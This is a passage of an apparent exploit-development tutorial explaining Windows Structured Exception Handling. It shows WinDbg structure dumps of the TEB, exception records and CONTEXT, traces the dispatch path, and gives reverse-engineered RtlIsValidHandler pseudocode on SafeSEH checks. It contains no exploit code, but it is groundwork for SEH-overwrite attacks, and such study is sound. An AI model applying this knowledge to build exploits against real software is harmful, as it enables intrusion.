</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1a4</span> ExceptionCode    : Int4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1ac</span> InstrumentationCallbackSp : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b0</span> InstrumentationCallbackPreviousPc : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b4</span> InstrumentationCallbackPreviousSp : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b8</span> InstrumentationCallbackDisabled : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b9</span> SpareBytes       : [<span style="color:#ae81ff">23</span>] UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d0</span> TxFsContext      : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6b4</span> RealClientId     : _CLIENT_ID
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c0</span> GdiClientPID     : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c4</span> GdiClientTID     : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6cc</span> Win32ClientInfo  : [<span style="color:#ae81ff">62</span>] Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x7c4</span> glDispatchTable  : [<span style="color:#ae81ff">233</span>] Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xb68</span> glReserved1      : [<span style="color:#ae81ff">29</span>] Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbdc</span> glReserved2      : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbe0</span> glSectionInfo    : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbe4</span> glSection        : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbe8</span> glTable          : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbec</span> glCurrentRC      : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbf0</span> glContext        : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbf4</span> LastStatusValue  : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbf8</span> StaticUnicodeString : _UNICODE_STRING
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xc00</span> StaticUnicodeBuffer : [<span style="color:#ae81ff">261</span>] Wchar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xe0c</span> DeallocationStack : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xe10</span> TlsSlots         : [<span style="color:#ae81ff">64</span>] Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf10</span> TlsLinks         : _LIST_ENTRY
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf18</span> Vdm              : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf1c</span> ReservedForNtRpc : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf20</span> DbgSsReserved    : [<span style="color:#ae81ff">2</span>] Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf28</span> HardErrorMode    : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf2c</span> Instrumentation  : [<span style="color:#ae81ff">9</span>] Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf50</span> ActivityId       : _GUID
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf60</span> SubProcessTag    : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf64</span> PerflibData      : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf68</span> EtwTraceData     : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf6c</span> WinSockData      : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf70</span> GdiBatchCount    : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf74</span> CurrentIdealProcessor : _PROCESSOR_NUMBER
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf74</span> IdealProcessorValue : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf74</span> ReservedPad0     : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf75</span> ReservedPad1     : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf76</span> ReservedPad2     : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf77</span> IdealProcessor   : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf78</span> GuaranteedStackBytes : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf7c</span> ReservedForPerf  : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf80</span> ReservedForOle   : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf84</span> WaitingOnLoaderLock : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf88</span> SavedPriorityState : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf8c</span> ReservedForCodeCoverage : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf90</span> ThreadPoolData   : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf98</span> MuiGeneration    : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf9c</span> IsImpersonating  : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfa0</span> NlsCache         : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfa4</span> pShimData        : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfa8</span> HeapData         : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfac</span> CurrentTransactionHandle : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfb4</span> FlsData          : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfb8</span> PreferredLanguages : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfbc</span> UserPrefLanguages : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc0</span> MergedPrefLanguages : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc4</span> MuiImpersonation : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc8</span> CrossTebFlags    : Uint2B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc8</span> SpareCrossTebBits : Pos <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span> Bits
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SameTebFlags     : Uint2B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SafeThunkCall    : Pos <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> InDebugPrint     : Pos <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> HasFiberData     : Pos <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SkipThreadAttach : Pos <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> WerInShipAssertCode : Pos <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> RanProcessInit   : Pos <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> ClonedThread     : Pos <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SuppressDebugMsg : Pos <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> DisableUserStackWalk : Pos <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> RtlExceptionAttached : Pos <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> InitialThread    : Pos <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SessionAware     : Pos <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> LoadOwner        : Pos <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> LoaderWorker     : Pos <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SkipLoaderInit   : Pos <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SpareSameTebBits : Pos <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span> Bit
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfcc</span> TxnScopeEnterCallback : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfd0</span> TxnScopeExitCallback : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfd4</span> TxnScopeContext  : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfd8</span> LockCount        : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfdc</span> WowTebOffset     : Int4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfe0</span> ResourceRetValue : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfe4</span> ReservedForWdf   : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfe8</span> ReservedForCrt   : Uint8B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xff0</span> EffectiveContainerId : _GUID
</span></span></code></pre></div><p>Inside this structure, at offset 0x0, there is the <code>_NT_TIB</code> structure.
Let&rsquo;s analyze it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _NT_TIB
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_NT_TIB
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> StackBase        : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x008</span> StackLimit       : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x00c</span> SubSystemTib     : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> FiberData        : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> Version          : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x014</span> ArbitraryUserPointer : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x018</span> Self             : Ptr32 _NT_TIB
</span></span></code></pre></div><p>We have the pointer called <strong>ExceptionList</strong> which points at a <code>_EXCEPTION_REGISTRATION_RECORD</code> structure.
Let&rsquo;s analyze this structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : Ptr32     _EXCEPTION_DISPOSITION 
</span></span></code></pre></div><p>We can see that this structure has a pointer to another <code>_EXCEPTION_REGISTRATION_RECORD</code> structure and a pointer to the Handler of this record.
The Handler parameter points <strong>to a callback function called <code>_except_handler</code></strong> which returns a <code>_EXCEPTION_DISPOSITION</code> structure. Let&rsquo;s see the <code>_except_handler</code> function prototype (not implementation, only parameters):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) (
</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord, 
</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame, 
</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord, 
</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
</span></span></code></pre></div><p>The <code>_except_handler</code> function can have different names depending on the OS (e.g, it is also called <code>ntdll!_except_handler4</code>). Depending on the Symbols provided for each version of Windows, it changes. However, the parameters and return value of the function are always the same.</p>
<p><strong>Note that this is the function that gets executed to manage the exception!</strong> This is the important thing to know.</p>
<p>We are interested on the second and third parameters of the EXCEPTION_DISPOSITION structure. These parameters are EstablisherFrame and ContextRecord.</p>
<ul>
<li>EstablisherFrame points to the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure, which is used to handle the exception.</li>
<li>ContextRecord is a pointer to a CONTEXT structure, which contains processor-specific register data at the time the exception was raised.</li>
</ul>
<p>Let&rsquo;s analyze the CONTEXT Structure in WinDbg. We can see that it contains many fields and also the states of <strong>all of our registers, including the EIP</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _CONTEXT
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> ContextFlags     : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Dr0              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x008</span> Dr1              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x00c</span> Dr2              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> Dr3              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x014</span> Dr6              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x018</span> Dr7              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x08c</span> SegGs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x090</span> SegFs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x094</span> SegEs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x098</span> SegDs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x09c</span> Edi              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a0</span> Esi              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a4</span> Ebx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a8</span> Edx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0ac</span> Ecx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b0</span> Eax              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b4</span> Ebp              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b8</span> Eip              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0bc</span> SegCs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c0</span> EFlags           : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c4</span> Esp              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c8</span> SegSs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0cc</span> ExtendedRegisters : [<span style="color:#ae81ff">512</span>] UChar
</span></span></code></pre></div><p>When the exception is handled, this CONTEXT information will be used <strong>to restore the execution flow after handling the exception</strong>, reverting the register information, etc. In case that any register is modified during the exception, this is like a wayback machine.</p>
<p>As mentioned earlier, the <code>_except_handler</code> function returns a <code>_EXCEPTION_DISPOSITION</code>structure.
If we inspect this structure, we can see that it contains the result of the exception handling process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_DISPOSITION
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_DISPOSITION
</span></span><span style="display:flex;"><span>   ExceptionContinueExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n0
</span></span><span style="display:flex;"><span>   ExceptionContinueSearch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n1
</span></span><span style="display:flex;"><span>   ExceptionNestedException <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n2
</span></span><span style="display:flex;"><span>   ExceptionCollidedUnwind <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n3
</span></span></code></pre></div><p>If the exception handler invoked by the OS is not valid for dealing with the exception, the return value will be ExceptionContinueSearch. This results in inspecting the &ldquo;Next&rdquo; pointer of the structure to move on to the next <code> _EXCEPTION_REGISTRATION_RECORD</code> structure in the linked list.
In the case that this handler is valid to handle the exception, it will return ExceptionContinueExecution, meaning that the execution can continue.</p>
<p>This is a diagram that details the process of SEH, as we have explained previously.
Basically consists in:</p>
<ul>
<li>Getting TEB address.</li>
<li>Accessing 0x0 of TEB to get NT_TIB</li>
<li>Accessing 0x0 of NT_TIB to get a pointer to the first <code>_EXCEPTION_REGISTRATION_RECORD</code> of the stack.</li>
<li>Try to execute the associated <code>_except_handler</code> of such <code>_EXCEPTION_REGISTRATION_RECORD</code>.</li>
<li>Depending on the <code>_EXCEPTION_DISPOSITION</code> return value of the function, navigate to the next <code>_EXCEPTION_REGISTRATION_RECORD</code> of the stack to keep managing the exception, or continue with the execution:</li>
</ul>
<p><img src="content/images/post_images/osed_2_4.png" alt=""></p>
<p>Now, let&rsquo;s see in details how the OS calls the exception handler functions and what checks are performed before invoking them.
When an exception is found, <code>ntdll!KiUserExceptionDispatcher</code> is called. This function is the responsible for <strong>dispatching exceptions on Windows OS</strong>.
The function takes two arguments:</p>
<ul>
<li>A <code>_EXCEPTION_RECORD</code> structure, that contains information about the exception.</li>
<li>A <code>CONTEXT</code> structure, with information about the running context of the thread (e.g., registers).</li>
</ul>
<p>Eventually this function will call the <code>RtlDispatchException</code> , which will retrieve the TEB and proceed to parse the ExceptionList through the mechanism already explained.
During the process of going through all the exceptions, for each <strong>Handler</strong> member in the list, the OS will ensure that the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure falls within the stack memory limits found in the TEB.
Also, more checks to the exception handler function are performed usng the <code>RtlIsValidHandler</code> function.</p>
<p><code>RtlIsValidHandler</code> is the responsible for the <strong>SafeSEH</strong> implementation. This is a mitigation introduced by Microsoft to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler.
At a high level, if a module is compiled with the SafeSEH flag, the linker will produce an <strong>image containing a table of safe exception handlers.</strong>
The operating system will then validate the <strong>exception_handler</strong> on the stack by comparing it to the <strong>entries in the table of safe exception handlers</strong>. If the handler is not found, the system will refuse to execute it.</p>
<p>Unfortunately, the source code for RtlIsValidHandler is not publicly available, so we must instead analyze the pseudo-code that was generated by security researchers after reverse engineering this function on Windows 8.1. This code will be similar to what the Windows 10 OS does, so we can analyze it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">RtlIsValidHandler</span>(Handler) <span style="color:#75715e">// NT 6.3.9600 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	{ 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Handler within the image */</span>) { 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (DllCharacteristics<span style="color:#f92672">-&gt;</span>IMAGE_DLLCHARACTERISTICS_NO_SEH) 
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> InvalidHandler; 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* The image is .Net assembly, &#39;ILonly&#39; flag is enabled */</span>) 
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> InvalidHandler; 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Found &#39;SafeSEH&#39; table */</span>) {
</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* The image is registered in &#39;LdrpInvertedFunctionTable&#39; (or its cache), or the initialization of the process is not complete */</span>) { 
</span></span><span style="display:flex;"><span>					 <span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Handler found in &#39;SafeSEH&#39; table */</span>) 
</span></span><span style="display:flex;"><span>						 <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>						 <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">goto</span> InvalidHandler; 
</span></span><span style="display:flex;"><span>					 } 
</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">return</span> TRUE; 
</span></span><span style="display:flex;"><span>			 } 
</span></span><span style="display:flex;"><span>			 <span style="color:#66d9ef">else</span> { 
</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* &#39;ExecuteDispatchEnable&#39; and &#39;ImageDispatchEnable&#39; flags are enabled in &#39;ExecuteOptions&#39; of the process */</span>) 
</span></span><span style="display:flex;"><span>					 <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Handler is in non-executable area of the memory */</span>) {
</span></span><span style="display:flex;"><span>					  <span style="color:#66d9ef">if</span> (ExecuteDispatchEnable) <span style="color:#66d9ef">return</span> TRUE; 
</span></span><span style="display:flex;"><span>				  } 
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (ImageDispatchEnable) <span style="color:#66d9ef">return</span> TRUE; 
</span></span><span style="display:flex;"><span>			} 
</span></span><span style="display:flex;"><span>			InvalidHandler: 
</span></span><span style="display:flex;"><span>				RtlInvalidHandlerDetected(...); 
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}			
